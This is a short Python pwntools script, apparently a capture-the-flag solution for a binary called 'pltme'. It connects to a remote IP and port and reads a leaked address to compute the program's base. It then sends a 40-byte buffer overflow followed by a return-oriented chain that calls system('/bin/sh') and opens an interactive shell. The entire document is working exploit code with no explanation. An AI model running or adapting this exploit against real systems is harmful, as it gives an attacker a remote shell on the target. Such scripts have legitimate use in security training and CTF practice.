# coding: utf-8
from pwn import *
#p = process("./pltme")
p = remote("207.154.239.148", 1341)
p.recvuntil(b"Leak: ")
leak = p.recvline()

mainOffset = 0x0122e
base = int(leak, 16) - mainOffset

poprdiOffset = 0x012f3
justretOffset = 0x0101a
binshOffset = 0x0200c
poprdi = base + poprdiOffset
justret = base + justretOffset
binsh = base + binshOffset
elf = ELF("./pltme")
syscallOffset = elf.plt.system
syscall = base + syscallOffset

payload = b"A"*40 + p64(poprdi) + p64(binsh) + p64(justret) + p64(syscall)
p.sendline(payload)
p.interactive()
